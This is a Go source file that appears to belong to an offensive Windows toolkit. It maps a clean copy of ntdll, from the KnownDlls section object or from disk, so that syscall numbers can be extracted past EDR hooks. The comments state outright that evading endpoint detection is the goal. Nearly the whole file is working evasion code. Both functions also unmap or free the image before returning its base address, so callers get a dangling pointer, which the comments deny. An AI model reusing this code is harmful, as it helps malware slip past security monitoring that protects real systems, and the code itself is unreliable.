//go:build windows

package win

import (
	"os"
	"path/filepath"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Clean ntdll sources for SSN extraction that an EDR could not have hooked:
//
//  1. \KnownDlls\ntdll.dll — a kernel section object created by smss.exe at
//     boot from the pristine on-disk ntdll. EDR kernel callbacks attach AFTER
//     boot, so this mapping is never patched. This is the same trick endgame
//     uses in hells_gate_windows.go.
//  2. C:\Windows\System32\ntdll.dll via LoadLibraryExW with
//     DONT_RESOLVE_DLL_REFERENCES (no DllMain, no hooks, fresh disk copy).
//
// Only the section object path is used before boot-time EDR attaches; the disk
// copy covers sandboxes/VDI where KnownDlls may be unavailable.

// objectAttributes64 mirrors OBJECT_ATTRIBUTES on x64 (48 bytes).
type objectAttributes64 struct {
	Length     uint32
	_          [4]byte // padding
	RootDir    uintptr
	ObjName    uintptr // *UNICODE_STRING
	Attributes uint32
	_          [4]byte
	SecDesc    uintptr
	SecQoS     uintptr
}

// unicodeString64 mirrors UNICODE_STRING on x64 (16 bytes).
type unicodeString64 struct {
	Length    uint16
	MaxLength uint16
	_         [4]byte // padding
	Buffer    uintptr
}

const (
	objCaseInsensitive = 0x00000040
	sectionMapRead     = 0x0004
	viewShare          = 0x1
	pageReadonly       = 0x02
)

// procNtXXX resolves the NT primitives needed to map the KnownDlls section,
// via the resolved export (IAT-free) path so the mapping itself never relies
// on an import table entry.
var (
	procNtOpenSection     = func() uintptr { a, _ := Resolve(ModuleNtdll(), "NtOpenSection"); return a }()
	procNtMapViewOfSection = func() uintptr { a, _ := Resolve(ModuleNtdll(), "NtMapViewOfSection"); return a }()
	procNtUnmapViewOfSection = func() uintptr { a, _ := Resolve(ModuleNtdll(), "NtUnmapViewOfSection"); return a }()
	procNtClose           = func() uintptr { a, _ := Resolve(ModuleNtdll(), "NtClose"); return a }()
	procLoadLibraryExW    = func() uintptr { a, _ := Resolve(ModuleKernel32(), "LoadLibraryExW"); return a }()
	procFreeLibrary       = func() uintptr { a, _ := Resolve(ModuleKernel32(), "FreeLibrary"); return a }()
)

// mapKnownDllsNtdll maps the \KnownDlls\ntdll.dll section into this process and
// returns its base (read-only). The mapping is unmapped before returning, so
// the caller must parse it synchronously. Returns ok=false on any failure.
func mapKnownDllsNtdll() (uintptr, bool) {
	if procNtOpenSection == 0 || procNtMapViewOfSection == 0 || procNtUnmapViewOfSection == 0 || procNtClose == 0 {
		return 0, false
	}
	path := `\KnownDlls\ntdll.dll`
	pathU16, _ := syscall.UTF16FromString(path)

	ustr := unicodeString64{
		Length:    uint16(len(pathU16)-1) * 2,
		MaxLength: uint16(len(pathU16)-1)*2 + 2,
		Buffer:    uintptr(unsafe.Pointer(&pathU16[0])),
	}
	oa := objectAttributes64{
		Length:     48,
		ObjName:    uintptr(unsafe.Pointer(&ustr)),
		Attributes: objCaseInsensitive,
	}

	var hSection uintptr
	r1, _, _ := syscallN(procNtOpenSection, uintptr(unsafe.Pointer(&hSection)), sectionMapRead, uintptr(unsafe.Pointer(&oa)), 0, 0, 0)
	if NtStatus(r1) != 0 {
		return 0, false
	}
	defer syscallN(procNtClose, hSection, 0, 0, 0, 0, 0)

	var base uintptr
	var size uintptr
	r2, _, _ := syscall.SyscallN(procNtMapViewOfSection,
		hSection,
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&base)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&size)),
		viewShare,
		0,
		pageReadonly)
	if NtStatus(r2) != 0 {
		return 0, false
	}
	defer syscallN(procNtUnmapViewOfSection, uintptr(windows.CurrentProcess()), base, 0, 0, 0, 0)

	// sanity: mapped memory must look like a PE
	dos := (*IMAGE_DOS_HEADER)(unsafe.Pointer(base))
	if dos.e_magic != 0x5A4D {
		return 0, false
	}
	return base, true
}

// mapNtdllFromDisk loads a clean copy of ntdll from disk with
// DONT_RESOLVE_DLL_REFERENCES (no DllMain, no import resolution) and returns
// its base. The module is freed before returning, so the caller must parse
// synchronously. Returns ok=false on any failure.
func mapNtdllFromDisk() (uintptr, bool) {
	if procLoadLibraryExW == 0 || procFreeLibrary == 0 {
		return 0, false
	}
	root := os.Getenv("SystemRoot")
	if root == "" {
		root = `C:\Windows`
	}
	path := filepath.Join(root, "System32", "ntdll.dll")
	pathW, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return 0, false
	}
	r1, _, _ := syscallN(procLoadLibraryExW, uintptr(unsafe.Pointer(pathW)), 0, 0x1 /* DONT_RESOLVE_DLL_REFERENCES */, 0, 0, 0)
	if r1 == 0 {
		return 0, false
	}
	defer syscallN(procFreeLibrary, r1, 0, 0, 0, 0, 0)
	return r1, true
}
